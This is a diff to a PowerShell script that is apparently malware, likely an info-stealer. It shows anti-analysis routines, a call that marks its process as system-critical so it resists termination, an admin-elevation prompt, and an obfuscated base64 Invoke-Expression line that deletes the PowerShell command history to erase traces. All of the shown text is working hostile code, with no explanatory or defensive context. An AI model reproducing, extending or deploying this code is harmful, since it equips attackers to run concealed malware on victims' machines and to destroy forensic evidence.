@@ -201,9 +201,9 @@ function Invoke-ANTITOTAL {
                 exit
             }
         }
-    }
+    } 
 
-    [ProcessUtility]::MakeProcessCritical()    
+    [ProcessUtility]::MakeProcessCritical()
     Invoke-TASKS
 }
 
@@ -1227,17 +1227,16 @@ if (INVOKE-AC -eq $true) {
         KDMUTEX
     }    
     if ($debug) {
-        Read-Host "[!] Press Enter to continue..."
-    }
-    else {
+        Start-Sleep -Seconds 50
+    } else {
         [ProcessUtility]::MakeProcessKillable()
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
-}
-else {
+    Exit 0
+} else {
     Write-Host ("[!] Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
